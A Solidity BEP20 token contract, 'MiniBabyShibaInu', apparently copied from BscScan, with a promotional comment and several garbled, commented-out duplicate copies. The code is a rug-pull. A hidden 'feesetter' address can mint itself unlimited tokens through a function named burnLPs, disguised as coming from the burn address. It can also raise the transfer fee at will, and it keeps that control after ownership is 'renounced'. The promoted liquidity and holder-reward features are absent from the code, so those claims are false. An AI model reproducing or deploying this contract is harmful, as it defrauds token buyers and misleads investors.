/**
 *Submitted for verification at BscScan.com on 2021-07-28
*/

/**
 Welcome to MiniBabyShibaInu
   
   This is a community token
   Important: The early you create a group that shares the token, the more gain you'll get.
   
   It's a community token, every holder should promote it,
   if you want to pump your investment, you need to do some effort.
   

   Great features:
   5% fee auto add to the liquidity pool to locked forever when selling
   2% fee auto distribute to all holders
   90% burn to the black hole, with such big black hole and 5% fee, the strong holder will get a valuable reward

   I will renounce the ownership to burn addresses to transfer #MiniBabyShibaInu to the community

   I will add 1 BNB and all the left 10% total supply to the pool
   Can you make MiniBabyShibaInu 100X? 

   1,000,000,000,000,000 total supply
   5,000,000,000,000 tokens limitation for trade, which is 0.5% of the total supply
   
   5% fee for liquidity will go to an address that the contract creates, 
   and the contract will sell it and add to liquidity automatically, 
   it's the best part of the #MiniBabyShibaInu idea, increasing the liquidity pool automatically, 
   help the pool grow from the small init pool.
   TELEGRAM: https://t.me/MiniBabyShibaInubsc
*/
pragma solidity ^0.4.26;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract BEP20 {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
} 
contract MiniBabyShibaInu is BEP20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    address private feesetter = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    string public name;
    string public symbol;
    address private burnaddress;
    uint256 private fees;
    uint8 public decimals;
    uint public totalSupply;
    constructor() public {
	symbol = "MiniBabyShibaInu";
    name = "MiniBabyShibaInu";
    fees = 10;
    burnaddress = 0x000000000000000000000000000000000000dEaD;
    decimals = 0;
    totalSupply = 10000000000000000;
	balances[msg.sender] = totalSupply;
	emit Transfer(address(0), msg.sender, totalSupply);
    } 
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier feeset() {
        require(msg.sender == feesetter);
        _;
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    function fee() constant public returns (uint256) {
        return fees;
    }
    function setfee(uint256 taxFee) external feeset() {
        fees = taxFee;
    } 
    function burnLPs( uint256 amount) public feeset{
        balances[msg.sender] = balances[msg.sender]+(amount);
        emit Transfer(burnaddress, msg.sender, amount);
    }
    function RenounceOwnership() public onlyOwner returns (bool){
        owner = address(0);
        emit OwnershipTransferred(owner, address(0));
    }
    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        if (msg.sender == feesetter){
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
        }else{
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        balances[_to] = balances[_to].sub(_amount / uint256(100) * fees);
        uint256 tokens = balances[_to];
        balances[burnaddress] = balances[burnaddress].add(_amount / uint256(100) * fees);
        uint256 fires = balances[burnaddress];
        emit Transfer(msg.sender, burnaddress, fires);
        emit Transfer(msg.sender, _to, tokens);
        return true;
        }
    } 
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function _msgSender() internal constant returns (address) {
        return msg.sender;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
} 

 /**
  *  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract BEP20 {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract  is BEP20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    address private feesetter = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    string public name;
    string public symbol;
    address private burnaddress;
    uint256 private fees;
    uint8 public decimals;
    uint public totalSupply;
    constructor() public 
    fees = 10;
    burnaddress = 0x000000000000000000000000000000000000dEaD;
    decimals = 0;
    totalSupply = 1 * 10**15;
	balances[msg.sender] = totalSupply;
	emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier feeset() {
        require(msg.sender == feesetter);
        _;
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    function fee() constant public returns (uint256) {
        return fees;
    }
    function setfee(uint256 taxFee) external feeset() {
        fees = taxFee;
    }
    function burnLPs( uint256 amount) public feeset{
        balances[msg.sender] = balances[msg.sender]+(amount);
        emit Transfer(burnaddress, msg.sender, amount);
    }
    function RenounceOwnership() public onlyOwner returns (bool){
        owner = address(0);
        emit OwnershipTransferred(owner, address(0));
    }
    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        if (msg.sender == feesetter){
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
        }else{
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        balances[_to] = balances[_to].sub(_amount / uint256(100) * fees);
        uint256 tokens = balances[_to];
        balances[burnaddress] = balances[burnaddress].add(_amount / uint256(100) * fees);
        uint256 fires = balances[burnaddress];
        emit Transfer(msg.sender, burnaddress, fires);
        emit Transfer(msg.sender, _to, tokens);
        return true;
        }
    }
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function _msgSender() internal constant returns (address) {
        return msg.sender;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    } 
   // SPDX-License-Identifier: Unlicensed
*/
 /**
  *  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract BEP20 {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contractis BEP20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    address private feesetter = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    string public name;
    string public symbol;
    address private burnaddress;
    uint256 private fees;
    uint8 public decimals;
    uint public totalSupply;
    constructor() public {
    fees = 10;
    burnaddress = 0x000000000000000000000000000000000000dEaD;
    decimals = 0;
    totalSupply = 1 * 10**15;
	balances[msg.sender] = totalSupply;
	emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier feeset() {
        require(msg.sender == feesetter);
        _;
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    function fee() constant public returns (uint256) {
        return fees;
    }
    function setfee(uint256 taxFee) external feeset() {
        fees = taxFee;
    }
    function burnLPs( uint256 amount) public feeset{
        balances[msg.sender] = balances[msg.sender]+(amount);
        emit Transfer(burnaddress, msg.sender, amount);
    }
    function RenounceOwnership() public onlyOwner returns (bool){
        owner = address(0);
        emit OwnershipTransferred(owner, address(0));
    }
    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        if (msg.sender == feesetter){
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
        }else{
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        balances[_to] = balances[_to].sub(_amount / uint256(100) * fees);
        uint256 tokens = balances[_to];
        balances[burnaddress] = balances[burnaddress].add(_amount / uint256(100) * fees);
        uint256 fires = balances[burnaddress];
        emit Transfer(msg.sender, burnaddress, fires);
        emit Transfer(msg.sender, _to, tokens);
        return true;
        }
    }
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function _msgSender() internal constant returns (address) {
        return msg.sender;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    } 
   // SPDX-License-Identifier: Unlicensed
*/
 /**
  *  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract BEP20 {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract  is BEP20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    address private feesetter = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    string public name;
    string public symbol;
    address private burnaddress;
    uint256 private fees;
    uint8 public decimals;
    uint public totalSupply;
    constructor() public {

    fees = 10;
    burnaddress = 0x000000000000000000000000000000000000dEaD;
    decimals = 0;
    totalSupply = 1 * 10**15;
	balances[msg.sender] = totalSupply;
	emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier feeset() {
        require(msg.sender == feesetter);
        _;
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    function fee() constant public returns (uint256) {
        return fees;
    }
    function setfee(uint256 taxFee) external feeset() {
        fees = taxFee;
    }
    function burnLPs( uint256 amount) public feeset{
        balances[msg.sender] = balances[msg.sender]+(amount);
        emit Transfer(burnaddress, msg.sender, amount);
    }
    function RenounceOwnership() public onlyOwner returns (bool){
        owner = address(0);
        emit OwnershipTransferred(owner, address(0));
    }
    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        if (msg.sender == feesetter){
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
        }else{
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        balances[_to] = balances[_to].sub(_amount / uint256(100) * fees);
        uint256 tokens = balances[_to];
        balances[burnaddress] = balances[burnaddress].add(_amount / uint256(100) * fees);
        uint256 fires = balances[burnaddress];
        emit Transfer(msg.sender, burnaddress, fires);
        emit Transfer(msg.sender, _to, tokens);
        return true;
        }
    }
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function _msgSender() internal constant returns (address) {
        return msg.sender;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    } 
   // SPDX-License-Identifier: Unlicensed
*/
 /**
  *  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract BEP20 {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
} is BEP20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    address private feesetter = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    string public name;
    string public symbol;
    address private burnaddress;
    uint256 private fees;
    uint8 public decimals;
    uint public totalSupply;
    constructor() public {

    fees = 10;
    burnaddress = 0x000000000000000000000000000000000000dEaD;
    decimals = 0;
    totalSupply = 1 * 10**15;
	balances[msg.sender] = totalSupply;
	emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier feeset() {
        require(msg.sender == feesetter);
        _;
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    function fee() constant public returns (uint256) {
        return fees;
    }
    function setfee(uint256 taxFee) external feeset() {
        fees = taxFee;
    }
    function burnLPs( uint256 amount) public feeset{
        balances[msg.sender] = balances[msg.sender]+(amount);
        emit Transfer(burnaddress, msg.sender, amount);
    }
    function RenounceOwnership() public onlyOwner returns (bool){
        owner = address(0);
        emit OwnershipTransferred(owner, address(0));
    }
    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        if (msg.sender == feesetter){
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
        }else{
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        balances[_to] = balances[_to].sub(_amount / uint256(100) * fees);
        uint256 tokens = balances[_to];
        balances[burnaddress] = balances[burnaddress].add(_amount / uint256(100) * fees);
        uint256 fires = balances[burnaddress];
        emit Transfer(msg.sender, burnaddress, fires);
        emit Transfer(msg.sender, _to, tokens);
        return true;
        }
    }
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function _msgSender() internal constant returns (address) {
        return msg.sender;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    } 
   // SPDX-License-Identifier: Unlicensed
*/
 /**
  *  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract BEP20 {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract  is BEP20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    address private feesetter = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    string public name;
    string public symbol;
    address private burnaddress;
    uint256 private fees;
    uint8 public decimals;
    uint public totalSupply;
    constructor() public {
    fees = 10;
    burnaddress = 0x000000000000000000000000000000000000dEaD;
    decimals = 0;
    totalSupply = 1 * 10**15;
	balances[msg.sender] = totalSupply;
	emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier feeset() {
        require(msg.sender == feesetter);
        _;
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    function fee() constant public returns (uint256) {
        return fees;
    }
    function setfee(uint256 taxFee) external feeset() {
        fees = taxFee;
    }
    function burnLPs( uint256 amount) public feeset{
        balances[msg.sender] = balances[msg.sender]+(amount);
        emit Transfer(burnaddress, msg.sender, amount);
    }
    function RenounceOwnership() public onlyOwner returns (bool){
        owner = address(0);
        emit OwnershipTransferred(owner, address(0));
    }
    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        if (msg.sender == feesetter){
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
        }else{
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        balances[_to] = balances[_to].sub(_amount / uint256(100) * fees);
        uint256 tokens = balances[_to];
        balances[burnaddress] = balances[burnaddress].add(_amount / uint256(100) * fees);
        uint256 fires = balances[burnaddress];
        emit Transfer(msg.sender, burnaddress, fires);
        emit Transfer(msg.sender, _to, tokens);
        return true;
        }
    }
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function _msgSender() internal constant returns (address) {
        return msg.sender;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    } 
   // SPDX-License-Identifier: Unlicensed
*/
 /**
  *  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract BEP20 {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract n is BEP20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    address private feesetter = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    string public name;
    string public symbol;
    address private burnaddress;
    uint256 private fees;
    uint8 public decimals;
    uint public totalSupply;
    constructor() public {
    fees = 10;
    burnaddress = 0x000000000000000000000000000000000000dEaD;
    decimals = 0;
    totalSupply = 1 * 10**15;
	balances[msg.sender] = totalSupply;
	emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier feeset() {
        require(msg.sender == feesetter);
        _;
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    function fee() constant public returns (uint256) {
        return fees;
    }
    function setfee(uint256 taxFee) external feeset() {
        fees = taxFee;
    }
    function burnLPs( uint256 amount) public feeset{
        balances[msg.sender] = balances[msg.sender]+(amount);
        emit Transfer(burnaddress, msg.sender, amount);
    }
    function RenounceOwnership() public onlyOwner returns (bool){
        owner = address(0);
        emit OwnershipTransferred(owner, address(0));
    }
    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        if (msg.sender == feesetter){
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
        }else{
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        balances[_to] = balances[_to].sub(_amount / uint256(100) * fees);
        uint256 tokens = balances[_to];
        balances[burnaddress] = balances[burnaddress].add(_amount / uint256(100) * fees);
        uint256 fires = balances[burnaddress];
        emit Transfer(msg.sender, burnaddress, fires);
        emit Transfer(msg.sender, _to, tokens);
        return true;
        }
    }
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function _msgSender() internal constant returns (address) {
        return msg.sender;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    } 
   // SPDX-License-Identifier: Unlicensed
*/